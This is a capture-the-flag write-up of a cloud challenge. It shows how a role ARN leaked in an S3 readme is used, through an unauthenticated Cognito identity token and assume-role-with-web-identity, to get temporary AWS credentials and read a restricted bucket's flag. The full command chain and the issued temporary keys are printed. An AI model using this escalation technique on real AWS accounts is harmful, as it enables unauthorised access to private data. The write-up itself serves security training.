# Orchestration but not really incognito!

## Task

![todo](images/02-01.png)

> The Syndicate stores surveillance imagery and reconnaissance data in an S3 image gallery. This repository, secured
with Amazon Cognito, contains critical intelligence. Infiltrate this system to access and analyze their surveillance
data.

## Solution

In the [previous challenge](01-serverless-espionage.md), we got access to the `syndicategallery-7474849` S3 bucket:

```
➜  ~ aws s3 ls s3://syndicategallery-7474849/                     
                           PRE html/
                           PRE images/
                           PRE info/
                           PRE secr3td1r/
2024-02-07 22:17:50     606895 image234.png
2024-02-07 22:17:54     543748 image235.png
2024-02-07 22:17:58     603551 image236.png
2024-02-07 22:18:00     587072 image237.png
2024-02-07 22:18:02     563220 image238.png
```

The `info/readme.md` file contains some instructions that expose the name of the S3 bucket supposedly used to store
the reconnaissance data mentioned in the task, and some role ARN:

```
➜  ~ aws s3 cp s3://syndicategallery-7474849/info/readme.md -
# DataHarbor

### Overview:

Welcome to DataHarbor, a sophisticated data management solution that simplifies the way organizations handle and interact with their data. This repository contains the source code and resources for DataHarbor, offering a seamless experience for data enthusiasts and professionals alike.

#### Getting Started:

To embark on your DataHarbor journey, follow these steps:

Clone this repository to your local machine:

git clone https://github.com/syndicate-public/dataharbor.git

Install the required dependencies:

npm install

Configure your environment variables by copying the example file:

cp .env.example .env

Update the .env file with your specific configurations, paying special attention to parameters such as S3_BUCKET_NAME and ROLE_ARN. Use the provided placeholders as a guide:

.env
S3_BUCKET_NAME=recondatabucket
ROLE_ARN=arn:aws:iam::816362139463:role/SecretDataViewerRole

Running the Application:

Once the setup is complete, launch DataHarbor using the following command:

npm start


Access the application locally by navigating to http://localhost:3000 in your web browser.

### Contributing:

We welcome contributions to DataHarbor! If you encounter issues or have suggestions for improvement, feel free to open an issue or submit a pull request.

### Security:

If you discover a potential security vulnerability, please contact our security team immediately at security@your-organization.com. We appreciate your responsible disclosure.

### License:

DataHarbor operates under the MIT License. Refer to the LICENSE file for details.

Happy data management! 🚀
```

With the current credentials, we don't have access to the `recondatabucket` S3 bucket. First, we can try to change our
role to the one mentioned in the `info/readme.md` file, but we don't have the necessary permissions to do so:

```
➜  ~ aws sts assume-role --role-arn arn:aws:iam::816362139463:role/SecretDataViewerRole --role-session-name test

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::816362139463:assumed-role/ProdS3ViewerCognitoRole1/CognitoIdentityCredentials is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::816362139463:role/SecretDataViewerRole
```

AFAIK, STS actions are [prohibited](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies)
for unauthenticated Cognito users, even if their role allows it.

Since we know the name of the role that should give us access to the `recondatabucket` S3 bucket, we can try to assume
it using the [classic Cognito authentication flow](https://docs.aws.amazon.com/cognito/latest/developerguide/authentication-flow.html):

```
➜  ~ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::816362139463:role/SecretDataViewerRole --role-session-name test --web-identity-token $(aws cognito-identity get-open-id-token --identity-id $(aws cognito-identity get-id --identity-pool-id us-east-1:9ad6519b-d074-4ce2-9584-cbd1c543d275 | jq -r .IdentityId) | jq -r .Token) --no-cli-pager
{
    "Credentials": {
        "AccessKeyId": "ASIA34EXZV5D5XA3RIGB",
        "SecretAccessKey": "f4EMMCmVMn3rUTMwS+oCrsC0KuFphn+Xo5CZeGyn",
        "SessionToken": "IQoJb3JpZ2luX2VjEB4aCXVzLWVhc3QtMSJHMEUCIQC8uGTMaxHN8WZzNasG85Jn3+Tvrg6Uw2erWkXXh3WTNgIgGdmBT4spl2mNNl+fWb1Sqa7vOfjl9Q9szaYD731wvYYqjgMI9v//////////ARAAGgw4MTYzNjIxMzk0NjMiDMQrKOtiRr7R2pjEWiriAjsz6TJf+cV6GYljnu6ENPb2TMOfo+nWVrM0nMmg+Vfb8sil9dri81Qc4kckt6FsQC2DORiCgvf5Fo3OyZbTty5+1AeiWE9hq+qN4j92v8x42Ch4N5PR2q3342EgPO+qUknPnvVrKdIkonlUUYpCOkp+oWrhuEZRVEdt4uPwbS7cN4Ik2ZB2bWGamKgUp4DWiApSC0AGlGVrGvGHeHJLTpwcI01FOAJ9DVQCxsQ2wgothegUHtEzzOGPIBmwYOFE137c4AuyVz5u1NbpuSRzY52sx9rFH2PQmd6LcteLkyVvYtIVv6FvXYBdyLQi3X/T2xOjmMLM3vIWrDt+lrzN66xFwyr2lGgEiv22h2DsHvgReR5nDrZRJn2UNC5VbfUzd+OcOaTBlJOW8kaHwbadnQ9BosTjdNwF5BnzQzzOvbp05HcLjQfxLrehNhOjc7LUCYKBsm1KNqE8X3xzadG2IqdpnzDb5cmuBjqHAuQ45m8wKafl3FxexDb5IW3hiXhVxMiSq03gUoogQNK5Fvqhi0XZHfd9dhodBGnyErFm03SLubxQHv0pVf/+GleDNoV97X7ynId6y0H8EsXRgWX3FOVNTw7+cbvRQPnf7ZdqzISpASbypFyuJibgD8SbQGstdSB18AeJ80dhQkE27QMeyqEtSwUaG+IFpffKdGLM9FJCzntfN0pqn10RXW7JaVy6os28X+Vyz7RKnAyaYDJtA3KogBtgaOl5thorgTYUwEYDrcmyBZotjIp2wR1NLrHbZ1ud2E/+DTd7weezgD47Sh+tNUnaHXPzExT+dRLxFxkC/PhTtPiluKwxs3c/BiCDFX04",
        "Expiration": "2024-02-18T22:12:59+00:00"
    },
    "SubjectFromWebIdentityToken": "us-east-1:be12f9af-4774-c972-70d4-43d18b55a8c9",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA34EXZV5DSCQOSSQLV:test",
        "Arn": "arn:aws:sts::816362139463:assumed-role/SecretDataViewerRole/test"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:9ad6519b-d074-4ce2-9584-cbd1c543d275"
}
```

Voilà, we got temporary credentials for the `SecretDataViewerRole` role!

```
➜  ~ export AWS_ACCESS_KEY_ID=ASIA34EXZV5D5XA3RIGB

➜  ~ export AWS_SECRET_ACCESS_KEY=f4EMMCmVMn3rUTMwS+oCrsC0KuFphn+Xo5CZeGyn

➜  ~ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEB4aCXVzLWVhc3QtMSJHMEUCIQC8uGTMaxHN8WZzNasG85Jn3+Tvrg6Uw2erWkXXh3WTNgIgGdmBT4spl2mNNl+fWb1Sqa7vOfjl9Q9szaYD731wvYYqjgMI9v//////////ARAAGgw4MTYzNjIxMzk0NjMiDMQrKOtiRr7R2pjEWiriAjsz6TJf+cV6GYljnu6ENPb2TMOfo+nWVrM0nMmg+Vfb8sil9dri81Qc4kckt6FsQC2DORiCgvf5Fo3OyZbTty5+1AeiWE9hq+qN4j92v8x42Ch4N5PR2q3342EgPO+qUknPnvVrKdIkonlUUYpCOkp+oWrhuEZRVEdt4uPwbS7cN4Ik2ZB2bWGamKgUp4DWiApSC0AGlGVrGvGHeHJLTpwcI01FOAJ9DVQCxsQ2wgothegUHtEzzOGPIBmwYOFE137c4AuyVz5u1NbpuSRzY52sx9rFH2PQmd6LcteLkyVvYtIVv6FvXYBdyLQi3X/T2xOjmMLM3vIWrDt+lrzN66xFwyr2lGgEiv22h2DsHvgReR5nDrZRJn2UNC5VbfUzd+OcOaTBlJOW8kaHwbadnQ9BosTjdNwF5BnzQzzOvbp05HcLjQfxLrehNhOjc7LUCYKBsm1KNqE8X3xzadG2IqdpnzDb5cmuBjqHAuQ45m8wKafl3FxexDb5IW3hiXhVxMiSq03gUoogQNK5Fvqhi0XZHfd9dhodBGnyErFm03SLubxQHv0pVf/+GleDNoV97X7ynId6y0H8EsXRgWX3FOVNTw7+cbvRQPnf7ZdqzISpASbypFyuJibgD8SbQGstdSB18AeJ80dhQkE27QMeyqEtSwUaG+IFpffKdGLM9FJCzntfN0pqn10RXW7JaVy6os28X+Vyz7RKnAyaYDJtA3KogBtgaOl5thorgTYUwEYDrcmyBZotjIp2wR1NLrHbZ1ud2E/+DTd7weezgD47Sh+tNUnaHXPzExT+dRLxFxkC/PhTtPiluKwxs3c/BiCDFX04

➜  ~ aws s3 ls s3://recondatabucket
                           PRE custom/
                           PRE s3cr3td1r/
2023-12-21 04:38:44     102029 emails-kasdnywen5jhJBGhsaDnsau.json
2023-12-21 04:38:49     498990 ip-address-ljkhl9kjbhKJTY87GBHgkjhbm.json
2023-12-21 04:38:44       9224 phone-kihvgasihfgdJHkjihKJHkjvhbD.json
```

Now we can retrieve the flag from the `s3cr3td1r` directory:

```
➜  ~ aws s3 ls s3://recondatabucket/s3cr3td1r/
2023-12-21 04:38:44         39 FLAG2.txt

➜  ~ aws s3 cp s3://recondatabucket/s3cr3td1r/FLAG2.txt -
FLAG{ff5ba7d26b1673c2f07a8ad631f2e2c0}
```
